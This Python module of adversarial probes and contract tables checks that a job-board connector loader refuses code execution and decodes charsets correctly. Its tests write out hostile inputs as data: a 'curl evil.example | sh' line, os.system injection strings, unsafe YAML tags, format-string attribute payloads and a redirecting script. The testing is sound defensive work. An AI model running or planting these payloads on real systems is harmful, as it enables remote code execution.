"""The connector gates: adversarial probes and the charset contracts.

Split out of `integral.connectors` unchanged (#928); the package re-exports every name.
"""

from __future__ import annotations

import json
import sys
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Final

from pydantic import ValidationError

from integral.connectors._base import (
    CONNECTOR_FILENAME,
    DEFAULT_CONNECTORS_DIR,
    DEFAULT_EVIDENCE_PATH,
    ConnectorError,
)
from integral.connectors.markup import (
    compile_selector,
)
from integral.connectors.model import (
    REPLACEMENT_LABELS,
    _take,
    compile_path,
    decode_body,
    dig,
    encoding_for,
)
from integral.connectors.read import (
    connector_packages,
    load_connector,
    parse_connector,
    parse_list_page,
)

# ---------------------------------------------------------------------------
# the gate — adversarial probes proving nothing a connector supplies runs


@dataclass(frozen=True)
class ProbeReport:
    """What the gate measured: how many adversarial attempts ran, and which
    ones were not refused."""

    probes_run: int
    violations: tuple[str, ...]


#: T132 — what `take:` must do, as a table read before the implementation and
#: kept beside it. Each row cites the reason its verdict is what it is, and the
#: fail-closed ones are the point: they are the direction where a wrong answer
#: is invisible. `None` means "this text is not that shape".
PARTIAL_EXTRACTION_CONTRACTS: tuple[tuple[str, str, str | None, str], ...] = (
    ("range_low", "\u20ac50.000 - \u20ac65.000", "50000", "landing.jobs, the band this exists for"),
    ("range_high", "\u20ac50.000 - \u20ac65.000", "65000", "the same span, other end"),
    ("currency", "\u20ac50.000 - \u20ac65.000", "EUR", "symbol, not code"),
    ("range_low", "1,234.56 - 2,345.67", "1234.56", "US convention, decimals kept"),
    ("range_high", "1.234,56 - 2.345,67", "2345.67", "continental convention, same figure"),
    (
        "range_low",
        "hasta \u20ac65.000, desde \u20ac50.000",
        "50000",
        "low is the smaller, not the first",
    ),
    ("range_low", "\u20ac60.000", None, "one figure is not a band — FAIL-CLOSED"),
    ("range_high", "Competitive", None, "no figures at all — FAIL-CLOSED"),
    (
        "range_low",
        "\u20ac250 - \u20ac350 per day, 40 hours",
        None,
        "three figures, nobody can say which two — FAIL-CLOSED",
    ),
    ("currency", "50000 - 65000", None, "no currency token — FAIL-CLOSED"),
    (
        "currency",
        "\u20ac50.000 (about $54,000)",
        None,
        "two currencies is a conversion — FAIL-CLOSED",
    ),
    ("range_low", "CAD 150K-190K", "150000", "foorilla.com writes every band this way"),
    ("range_high", "CAD 150K-190K", "190000", "the K is a multiplier, not decoration"),
    ("currency", "CAD 150K-190K", "CAD", "an ISO code with no symbol"),
    ("range_low", "$1.2M - $1.5M", "1200000", "M as well as K"),
    (
        "range_low",
        "40k hires, \u20ac50.000 - \u20ac65.000",
        None,
        "a k elsewhere makes three figures — FAIL-CLOSED",
    ),
)

#: Floor. A table that shrank reports `unmeasured` rather than a clean zero.
MINIMUM_PARTIAL_EXTRACTION_CONTRACTS = 16


def partial_extraction_defects() -> list[str]:
    """Every contract in `PARTIAL_EXTRACTION_CONTRACTS` whose verdict is wrong."""
    failures = []
    for take, text, expected, why in PARTIAL_EXTRACTION_CONTRACTS:
        actual = _take(take, text)  # type: ignore[arg-type]
        if actual != expected:
            failures.append(f"take:{take} on {text!r} -> {actual!r}, expected {expected!r} ({why})")
    return failures


class _Refused:
    """The verdict "the grammar must not compile this path at all"."""

    def __repr__(self) -> str:  # pragma: no cover - a label in a failure message
        return "REFUSED"


#: Distinct from `None`, and the distinction is the point: `None` is a path the
#: grammar accepted and that resolved to nothing, `REFUSED` is a path
#: `compile_path` must reject outright. A contract table that could not tell
#: them apart would score a refused spelling and a silently-empty one the same.
REFUSED: Final = _Refused()

#: The one document nearly every array-path contract is read against. Written
#: to hold, side by side, each shape the grammar has to have an answer for: a
#: populated array, an empty one, an array of objects, an array of a number, of
#: a bool and of a null, an object where an array might be, and a mapping whose
#: key is literally `"0"`.
_ARRAY_PATH_DOCUMENT: Final[dict[str, Any]] = {
    "locations": ["Marbella, Espa\u00f1a", "Madrid, Espa\u00f1a"],
    "empty": [],
    "offices": [{"city": "Barcelona"}],
    "figures": [50000],
    "flags": [True],
    "maybe": [None],
    "company": {"name": "Manfred"},
    "counts": {"0": "seven"},
    "nested": {"tags": ["alpha"]},
    "grid": [["alpha", "beta"]],
}

#: An index segment long enough that `int()` refuses to convert it. Built
#: rather than typed out: the point is the digit count, and 4301 nines in a
#: source file would be unreadable and unmaintainable.
_OVERLONG_INDEX: Final = "locations." + "9" * 4301

#: T118 — what an array path must resolve to, as a table derived from the
#: **grammar** and kept beside it, in the shape `PARTIAL_EXTRACTION_CONTRACTS`
#: established for `take:`. Each row cites why its verdict is what it is, and
#: the fail-closed rows are the ones that matter: a location that is missing is
#: a gap the candidate can see, while `{'city': 'Barcelona'}` or `M` landing in
#: `location_raw` is a place that is simply wrong and looks fine.
ARRAY_PATH_CONTRACTS: tuple[tuple[str, Any, str | _Refused | None, str], ...] = (
    (
        "locations.0",
        _ARRAY_PATH_DOCUMENT,
        "Marbella, Espa\u00f1a",
        "getmanfred's physical city, which no path could reach before T118",
    ),
    ("locations.1", _ARRAY_PATH_DOCUMENT, "Madrid, Espa\u00f1a", "an index other than the first"),
    ("locations.2", _ARRAY_PATH_DOCUMENT, None, "index past the end — FAIL-CLOSED"),
    (
        "empty.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'getmanfred sends `"locations":[]` — absent, never an empty string — FAIL-CLOSED',
    ),
    (
        "locations",
        _ARRAY_PATH_DOCUMENT,
        None,
        "the array itself is still a container, so still a miss — the rule indexing must "
        "not relax — FAIL-CLOSED",
    ),
    (
        "offices.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "the element is an object; `str({...})` must never reach `build_offer` — FAIL-CLOSED",
    ),
    ("offices.0.city", _ARRAY_PATH_DOCUMENT, "Barcelona", "a key after an index — `a.0.b`"),
    ("nested.tags.0", _ARRAY_PATH_DOCUMENT, "alpha", "an index after two keys"),
    (
        "company.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "an object is not a sequence, so it is not indexable — FAIL-CLOSED",
    ),
    (
        "counts.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'a mapping key spelled "0" is not element 0: an index reads a sequence and '
        "nothing else, and this is the row that states it — FAIL-CLOSED",
    ),
    (
        "locations.0.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'a string is not a sequence either: `"Marbella"[0]` is `M`, which is not a '
        "place — FAIL-CLOSED",
    ),
    (
        "figures.0",
        _ARRAY_PATH_DOCUMENT,
        "50000",
        "a JSON number inside an array is a scalar like any other",
    ),
    (
        "flags.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "JSON's `true` is not a wage, a title or a body, inside an array or out — FAIL-CLOSED",
    ),
    (
        "maybe.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'an element that is `null` is absent, never the text "None" — FAIL-CLOSED',
    ),
    (
        "locations.9999",
        _ARRAY_PATH_DOCUMENT,
        None,
        "a far index misses rather than raising — FAIL-CLOSED",
    ),
    (
        "locations.-1",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "there is no negative index, so nothing wraps around to the last element",
    ),
    (
        "locations.01",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "one spelling per index, and `01` is a second one",
    ),
    ("locations[0]", _ARRAY_PATH_DOCUMENT, REFUSED, "bracket syntax the grammar does not have"),
    (
        "locations.1_0",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "`_` is a Python numeric separator, not a JSON index",
    ),
    (
        "0",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "a bare leading index is `str.format`'s positional syntax, and a path names a "
        "field of a record",
    ),
    (
        "$",
        _ARRAY_PATH_DOCUMENT,
        None,
        "`$` still names the document, and a document is a container — `items:` reads it "
        "through `dig_container`, never `dig` — FAIL-CLOSED",
    ),
    # The five below were accepted from the independent second read of #401,
    # which found them absent rather than wrong. Each is derived from a rule
    # the vocabulary already states, not from what the resolver returns.
    (
        "grid.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "the element at the index is itself an array, and `dig`'s container rule is about "
        "what a path LANDS on, not about how it got there — `str([...])` reaching "
        "`location_raw` is the same invented place as `str({...})` — FAIL-CLOSED",
    ),
    (
        "grid.0.1",
        _ARRAY_PATH_DOCUMENT,
        "beta",
        "index after index, both in range: the walk has one interpretation per segment, so "
        "`a.0.1` composes exactly as `a.0.b` does",
    ),
    (
        "offices.0.country",
        _ARRAY_PATH_DOCUMENT,
        None,
        "`a.0.b` where the element carries no `b`: a key segment reads a mapping and the "
        "key is absent, so it is a miss — an index earlier in the path buys no "
        "leniency later — FAIL-CLOSED",
    ),
    (
        "locations.",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "a trailing dot names an empty segment, which is neither a key nor an index in "
        "`JSON_PATH` — refused at load, where a typo is visible, rather than resolved to "
        "nothing at parse time",
    ),
    (
        _OVERLONG_INDEX,
        _ARRAY_PATH_DOCUMENT,
        None,
        "an index of 4301 digits is past the end like any other, and `_resolve` promises "
        "out of range is a miss 'rather than raising' — a `ValueError` escaping the walk "
        "is neither the value nor the miss the grammar names",
    ),
)

#: Floor, in `naming.MINIMUM_SCANNED`'s style: what is committed as the
#: denominator is this number, never the count of the day. It **rises** with
#: the table — CLAUDE.md requires the measured denominator to grow when a
#: second reader's cases are accepted — and never falls, so a table quietly
#: emptied reports `unmeasured` instead of a clean zero over nothing.
MINIMUM_ARRAY_PATH_CONTRACTS = 26


def _resolve_declared(path: str, document: Any) -> str | _Refused | None:
    """One contract's verdict: what a connector declaring `path` would read.

    Deliberately the whole journey a connector file takes — compile, then dig —
    because the grammar's safety property is split across the two and a table
    testing only `dig` would score `locations[0]` on whatever `dig` did with a
    path that never should have compiled.
    """
    try:
        compiled = compile_path(path)
    except ConnectorError:
        return REFUSED
    return dig(document, compiled)


def array_path_defects() -> list[str]:
    """Every contract in `ARRAY_PATH_CONTRACTS` whose verdict is wrong."""
    failures = []
    for path, document, expected, why in ARRAY_PATH_CONTRACTS:
        actual = _resolve_declared(path, document)
        if actual != expected:
            failures.append(f"{path!r} -> {actual!r}, expected {expected!r} ({why})")
    return failures


def measure_array_paths() -> dict[str, Any]:
    """T118's record: array paths resolved against the grammar, then counted.

    The defects are computed **before** the dict is built, so no run can write
    the claim and then discover it was wrong — the ordering #297 asks for.
    """
    defects = array_path_defects()
    pairs = len(ARRAY_PATH_CONTRACTS)
    measured: dict[str, Any] = {
        "connector_array_paths_misresolved": len(defects),
        "connector_array_path_pairs_at_least": MINIMUM_ARRAY_PATH_CONTRACTS,
        "connector_array_path_defects": defects,
        "gate_status": "measured" if pairs >= MINIMUM_ARRAY_PATH_CONTRACTS else "unmeasured",
    }
    if pairs < MINIMUM_ARRAY_PATH_CONTRACTS:
        measured["reasons"] = [
            f"only {pairs} path/document pair(s) evaluated (floor "
            f"{MINIMUM_ARRAY_PATH_CONTRACTS}) — zero misresolutions over a shrunken "
            "table says nothing"
        ]
    return measured


def write_array_path_evidence(evidence: Path) -> dict[str, Any]:
    """Measure and record `status/evidence/T118.json`."""
    measured = measure_array_paths()
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def probe_connector_isolation() -> ProbeReport:
    """Try every way a connector file could try to run code, and count the
    ones that got through.

    Mirrors `integral.identity.probe_leaks`'s shape: this is the gate's
    measurement, deliberately adversarial, and a probe that returns normally
    where it should have been refused is a violation — named, not swallowed.
    """
    violations: list[str] = []
    probes = 0

    def must_be_refused(label: str, attempt: Any) -> None:
        nonlocal probes
        probes += 1
        try:
            attempt()
        except (ConnectorError, ValidationError, ValueError):
            return
        violations.append(label)

    # 1. An unsafe YAML tag attempting to construct an arbitrary object.
    must_be_refused(
        "!!python/object tag constructs an object instead of failing to load",
        lambda: parse_connector(
            "site: !!python/object/apply:builtins.str ['x']\n"
            "locale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.x'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 2. A Python expression as a selector — must fail to *parse*, not run.
    must_be_refused(
        "a python expression as a css selector is accepted instead of refused",
        lambda: compile_selector("__import__('os').system('touch /tmp/pwned')"),
    )

    # 3. The same, smuggled inside an otherwise well-formed connector file —
    #    caught by `FieldSelector`'s own validator, at load, not merely when
    #    something later tries to use it.
    must_be_refused(
        "a smuggled selector expression loads successfully as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: \"__import__('os').system('x')\"}\n"
        ),
    )

    # 4. An unknown top-level key — the shell-command-shaped smuggling case
    #    from the payload — must be refused by `extra='forbid'`.
    must_be_refused(
        "an unknown top-level key ('shell') is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            'shell: "curl evil.example | sh"\n'
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 5. A lambda as a bare value — not executable YAML, just a string that
    #    fails `site`'s own pattern.
    must_be_refused(
        "a lambda-shaped string is accepted as a site name",
        lambda: parse_connector(
            "site: \"lambda: __import__('os').system('x')\"\nlocale: en\n"
            "version: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 6. A field name that IS a credential — rejected for not being in the
    #    closed field vocabulary, independent of whether 'password' *looks*
    #    dangerous.
    must_be_refused(
        "a 'password' field is accepted as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n    password: {css: '.secret'}\n"
        ),
    )

    # 7. A credential-shaped top-level key.
    must_be_refused(
        "a top-level 'api_key' is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "api_key: 'sk-does-not-belong-here'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 8. An `auth` value other than "none"/"candidate_session" — the only two
    #    the Literal allows — must be refused, closing off e.g. `auth: basic`
    #    plus an implied (even if absent today) credential field later.
    must_be_refused(
        "auth: password is accepted as an authentication mode",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "auth: password\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 9. A url_pattern carrying a format-string attribute-access payload
    #    alongside the legitimate placeholder — refused at load by the
    #    dedicated validator, not merely left un-formatted.
    must_be_refused(
        "a url_pattern with an extra brace group loads successfully",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test?p={page}&x={0.__class__}'\n"
            "  item: '.job'\n  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 10. `<script>` markup embedded in a fixture must come through as inert
    #     text if a selector happens to match it — never executed (there is
    #     no JS engine here to execute it in the first place, but the
    #     assertion is that its content is returned unchanged as a string).
    probes += 1
    connector = parse_connector(
        "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
        "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
        "  fields:\n    text: {css: 'script'}\n"
    )
    payload = "alert('should never run'); window.location='https://evil.example'"
    html = f"<div class='job'><script>{payload}</script></div>"
    records = parse_list_page(connector, html)
    if not records or records[0].get("text") != payload:
        violations.append("script content was not returned as inert text")

    # 11. A malformed connector (missing every required field) must be
    #     refused rather than silently defaulting.
    must_be_refused(
        "an empty mapping is accepted as a connector",
        lambda: parse_connector("{}"),
    )

    # 12. `!!python/name` — a different unsafe tag family — must also fail to
    #     load, not just the `/object/apply` shape probe 1 already covers.
    must_be_refused(
        "!!python/name tag resolves a name instead of failing to load",
        lambda: parse_connector("site: !!python/name:os.system\nlocale: en\n"),
    )

    # 13-15. `detail_url_template` is the SECOND connector-controlled brace
    #     grammar in this file, and probe 9 only covers the first (`url_pattern`
    #     and its `{page}`). The same three payloads, aimed at the new surface:
    #     an attribute-access path inside a slot, a leftover brace, and an empty
    #     slot. Each must be refused at load by `compile_url_template`.
    def _json_connector(template: str) -> str:
        return (
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n"
            "  from_json:\n    items: '$'\n"
            f"    detail_url_template: '{template}'\n"
            "    fields:\n      text: body\n"
        )

    must_be_refused(
        "a detail_url_template slot naming an attribute path loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{0.__class__}")),
    )
    must_be_refused(
        "a detail_url_template with a leftover brace loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{id}/{0.__class__.__init__")),
    )
    must_be_refused(
        "an empty detail_url_template slot loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{}")),
    )

    return ProbeReport(probes_run=probes, violations=tuple(violations))


# A run that tried fewer than this measured nothing — the same "pass over
# nothing is not a pass" floor `identity.py`'s `MINIMUM_PROBES` enforces.
# Raised to what `probe_connector_isolation` carries — 15, zero slack — because
# 10 tolerated five deleted probes silently, with no margin argued (T159).
MINIMUM_PROBES = 15


# ---------------------------------------------------------------------------
# T128's gate: the charset contracts
#
# Written from the WHATWG Encoding Standard and WHATWG HTML **before** the
# decoder existed (`tmp/charset-cases.md` in the branch that added this records
# the table and the date). That ordering is the whole point: CLAUDE.md requires
# a session other than the implementer to derive a correctness-critical gate's
# cases from the spec, precisely so the cases are not a description of what the
# code already does. No second session was available; deriving the table from
# the standard first is the nearest available substitute and is weaker, and the
# pull request says so rather than claiming the rule was met.
#
# Every contract cites the clause its verdict comes from. A verdict argued from
# what the decoder does is the circularity this exists to break.

#: Each entry: name, the clause it is derived from, and a callable that returns
#: True when the contract holds. Behavioural — nothing here reads source text,
#: so a comment cannot satisfy one and a hard-coded pass cannot either.
CHARSET_CONTRACTS: tuple[tuple[str, str, Callable[[], bool]], ...] = (
    (
        "iso_8859_1_decodes_as_windows_1252",
        "Encoding §4.2 — `iso-8859-1` is a label OF windows-1252; the index has "
        "no separate latin-1 decoder. FAIL-OPEN: 0x92 is undefined in true "
        "Latin-1 and is a right single quote in cp1252.",
        lambda: decode_body(b"don\x92t", "iso-8859-1") == "don\u2019t",
    ),
    (
        "latin1_aliases_resolve_to_the_same_encoding",
        "Encoding §4.2 — latin1, l1, csisolatin1 share one label set.",
        lambda: (
            {encoding_for(label) for label in ("latin1", "l1", "csisolatin1", "iso8859-1")}
            == {"cp1252"}
        ),
    ),
    (
        "us_ascii_decodes_as_windows_1252",
        "Encoding §4.2 — us-ascii is also a windows-1252 label. FAIL-OPEN: a "
        "board declaring ascii and serving a £ would otherwise lose it.",
        lambda: decode_body(b"\xa3100", "us-ascii") == "\u00a3100",
    ),
    (
        "labels_are_case_insensitive_and_trimmed",
        "Encoding §4.2 — labels match ASCII-case-insensitively after stripping "
        "leading and trailing whitespace.",
        lambda: encoding_for("  ISO_8859-1  ") == encoding_for("iso-8859-1") == "cp1252",
    ),
    (
        "a_utf8_bom_wins_and_is_removed",
        "HTML 'Determining the character encoding' step 1 — the BOM is "
        "authoritative and is not content. FAIL-OPEN: a leftover U+FEFF lands "
        "inside the first extracted field of the page.",
        lambda: decode_body(b"\xef\xbb\xbfHola", "iso-8859-1") == "Hola",
    ),
    (
        "a_utf16_bom_selects_utf16_and_is_removed",
        "HTML 'Determining the character encoding' step 1 — FF FE and FE FF "
        "select UTF-16LE and UTF-16BE.",
        lambda: (
            decode_body(b"\xff\xfeH\x00i\x00", "utf-8") == "Hi"
            and decode_body(b"\xfe\xff\x00H\x00i", "utf-8") == "Hi"
        ),
    ),
    (
        "an_unknown_label_is_refused_not_defaulted",
        "Encoding §4.2 — a label matching nothing has no encoding. FAIL-OPEN if "
        "defaulted: a typo'd charset would silently mojibake every advert.",
        lambda: _refuses(lambda: encoding_for("banana")),
    ),
    (
        "replacement_decoder_labels_are_refused",
        "Encoding §4.2 — these map to the replacement decoder, whose purpose is "
        "to refuse. FAIL-OPEN if accepted: it yields U+FFFD for everything. "
        "Asserts the REASON, not just the refusal: deleting the guard still "
        "refuses these labels via the unknown-label path, so a contract asking "
        "only 'did it raise' passes over a deleted check. Caught by mutating "
        "the guard away and watching this contract stay green.",
        lambda: all(_refused_as_replacement(label) for label in REPLACEMENT_LABELS),
    ),
    (
        "an_undecodable_body_refuses_rather_than_replacing",
        "repo policy, and a deliberate departure: Encoding §6 specifies U+FFFD "
        "for a decode error, which is right for RENDERING. This library "
        "produces evidence a candidate reads. THE fail-open of this task: "
        "errors='replace' is what gives 'T\ufffdcnico de Manuten\ufffd\ufffdo'.",
        lambda: _refuses(lambda: decode_body("Técnico".encode("cp1252"), "utf-8")),
    ),
    (
        "a_connector_declaring_an_unknown_charset_will_not_load",
        "repo policy: refused at load like every other unusable field. cp1252 "
        "never raises, so a typo caught at fetch time would never be caught "
        "at all — load is the last place this can fail loudly.",
        lambda: _refuses(
            lambda: parse_connector(
                "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
                "charset: banana\n"
                "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
                "  fields:\n    text: {css: '.x'}\n"
            ),
            (ConnectorError, ValueError),
        ),
    ),
    (
        "an_empty_body_decodes_to_an_empty_string",
        "repo policy: nothing to decode is not an error. FAIL-CLOSED if it raised.",
        lambda: decode_body(b"", "iso-8859-1") == "",
    ),
    (
        "text_that_is_already_str_is_returned_unchanged",
        "repo policy: there is nothing to decode. Guards the committed captures, "
        "which are read from disk as str.",
        lambda: decode_body("Técnico", "iso-8859-1") == "Técnico",
    ),
    (
        "every_committed_capture_survives_its_declared_charset",
        "repo policy: the round trip the case table names as the ONLY check for "
        "'declared latin-1, actually UTF-8'. cp1252 never raises, so that case "
        "is invisible to the decoder and catchable only against real captures.",
        lambda: not _captures_outside_their_charset(),
    ),
)


def _refused_as_replacement(label: str) -> bool:
    """True when `label` is refused **for being a replacement label**.

    `REPLACEMENT_LABELS` is, today, unreachable by accident: none of its labels
    is in `ENCODING_LABELS` either, so deleting the guard leaves them refused
    as unknown. That makes the guard look like dead code and makes any contract
    asking merely "did it raise" green over its removal.

    It is not dead code, and the distinction is the reason. A later maintainer
    adding CJK support would put `iso-2022-cn` into `ENCODING_LABELS` and get a
    decoder returning U+FFFD for every character of every advert — the guard is
    what refuses that, and only then. So the contract reads the message.
    """
    try:
        encoding_for(label)
    except ConnectorError as error:
        return "replacement decoder" in str(error)
    return False


def _refuses(call: Callable[[], Any], exceptions: Any = ConnectorError) -> bool:
    """True when `call` raises. A contract asserting a refusal must observe one."""
    try:
        call()
    except exceptions:
        return True
    except Exception:
        return False
    return False


def _captures_outside_their_charset(
    directory: Path = DEFAULT_CONNECTORS_DIR,
) -> list[str]:
    """Committed captures holding a character their board's charset cannot carry.

    Every capture in this library is committed as UTF-8 — that is a repository
    rule, not a fact about the boards. `charset` describes the *live* board. So
    the assertion is that the text actually shipped could have come from that
    board: a package declaring iso-8859-1 whose fixture contains a CJK
    character has either the wrong declaration or a corrupted capture, and both
    are worth knowing before a candidate reads it.
    """
    outside: list[str] = []
    for package in connector_packages(directory):
        try:
            connector = load_connector(package / CONNECTOR_FILENAME)
        except Exception:
            continue
        codec = encoding_for(connector.charset)
        for capture in sorted(package.rglob("*.html")):
            try:
                capture.read_text(encoding="utf-8").encode(codec)
            except UnicodeEncodeError as error:
                outside.append(f"{package.name}/{capture.relative_to(package)}: {error}")
            except UnicodeDecodeError:
                outside.append(
                    f"{package.name}/{capture.relative_to(package)}: not committed as UTF-8"
                )
    return outside


#: A library that lost its contracts must not report a clean zero.
MINIMUM_CHARSET_CONTRACTS = 13


def measure_charset() -> dict[str, Any]:
    """T128's gate reading: `charset_contracts_failing`."""
    failing: list[str] = []
    for name, clause, contract in CHARSET_CONTRACTS:
        try:
            held = contract()
        except Exception as error:
            held = False
            clause = f"{clause} [raised {type(error).__name__}: {error}]"
        if not held:
            failing.append(f"{name}: {clause}")
    checked = len(CHARSET_CONTRACTS)
    return {
        "charset_contracts_failing": len(failing),
        "charset_contracts_checked": checked,
        "charset_contracts_at_least": MINIMUM_CHARSET_CONTRACTS,
        "gate_status": "measured" if checked >= MINIMUM_CHARSET_CONTRACTS else "unmeasured",
        "failed_contracts": failing,
        "captures_outside_their_charset": _captures_outside_their_charset(),
        "contracts_checked_by_name": [name for name, _, _ in CHARSET_CONTRACTS],
    }


def write_charset_evidence(evidence: Path) -> dict[str, Any]:
    """Measure and record `status/evidence/T128.json`."""
    measured = measure_charset()
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def write_evidence(evidence: Path = DEFAULT_EVIDENCE_PATH) -> dict[str, Any]:
    """Measure `connector_executes_no_shared_code` and record it.

    `1` means every adversarial attempt in `probe_connector_isolation` was
    refused; `0` means at least one was not — the flag is never a vacuous
    pass, because `_main` refuses to report it at all when too few probes ran.
    """
    report = probe_connector_isolation()
    defects = partial_extraction_defects()
    measured: dict[str, Any] = {
        "connector_executes_no_shared_code": 1 if not report.violations else 0,
        "probes_run": report.probes_run,
        "violations": list(report.violations),
        # T132. The `take:` vocabulary is this file's answer to "read part of a
        # text node without running anything the connector wrote", so its
        # contracts are measured beside the isolation probes rather than in a
        # file of their own.
        "partial_extraction_contracts_failing": len(defects),
        "partial_extraction_contracts_run": len(PARTIAL_EXTRACTION_CONTRACTS),
        "partial_extraction_defects": defects,
    }
    if len(PARTIAL_EXTRACTION_CONTRACTS) < MINIMUM_PARTIAL_EXTRACTION_CONTRACTS:
        measured["gate_status"] = "unmeasured"
        measured["reasons"] = [
            f"only {len(PARTIAL_EXTRACTION_CONTRACTS)} partial-extraction contract(s) "
            f"(floor {MINIMUM_PARTIAL_EXTRACTION_CONTRACTS}) — a zero over a shrunken "
            "table says nothing"
        ]
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def _main(argv: list[str]) -> int:
    """`python -m integral.connectors [path]` → T32's gate evidence."""
    positional = [arg for arg in argv[1:] if not arg.startswith("--")]
    target = Path(positional[0]) if positional else DEFAULT_EVIDENCE_PATH
    measured = write_evidence(target)
    # T128 beside T32, wherever T32 was asked for — the same shape
    # `connector_health` uses for T72/T73/T127. A caller redirecting one record
    # to a scratch directory is not asking to have the other written into the
    # repository.
    charset = write_charset_evidence(target.parent / "T128.json")
    # T118 beside them, for the same reason: array indexing is a property of
    # this module's path grammar, not of any one connector package.
    arrays = write_array_path_evidence(target.parent / "T118.json")
    print(json.dumps(measured, ensure_ascii=False))
    if charset["charset_contracts_failing"]:
        for failure in charset["failed_contracts"]:
            print(f"charset contract failed: {failure}", file=sys.stderr)
        return 1
    for capture in charset["captures_outside_their_charset"]:
        print(f"capture outside its declared charset: {capture}", file=sys.stderr)
    if charset["captures_outside_their_charset"]:
        return 1
    for defect in arrays["connector_array_path_defects"]:
        print(f"array path misresolved: {defect}", file=sys.stderr)
    if arrays["connector_array_paths_misresolved"]:
        return 1
    if arrays["gate_status"] == "unmeasured":
        print(
            f"only {len(ARRAY_PATH_CONTRACTS)} path/document pair(s) evaluated (floor "
            f"{MINIMUM_ARRAY_PATH_CONTRACTS})",
            file=sys.stderr,
        )
        # `1`, not the `3` its neighbours return. `Makefile:58-70` maps exit 3 to
        # `unmeasured (recorded)` and CONTINUES (#297, #309), so a gutted table
        # would leave `make evidence` green over a gate nobody could fail.
        return 1
    if charset["gate_status"] == "unmeasured":
        print(
            f"only {charset['charset_contracts_checked']} charset contract(s) "
            f"(floor {charset['charset_contracts_at_least']})",
            file=sys.stderr,
        )
        return 3
    if measured["probes_run"] < MINIMUM_PROBES:
        print(
            f"only {measured['probes_run']} probe(s) ran (floor {MINIMUM_PROBES}) — "
            "a pass over nothing is not a pass",
            file=sys.stderr,
        )
        return 3
    for violation in measured["violations"]:
        print(f"connector isolation breach: {violation}", file=sys.stderr)
    return 1 if measured["violations"] else 0


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
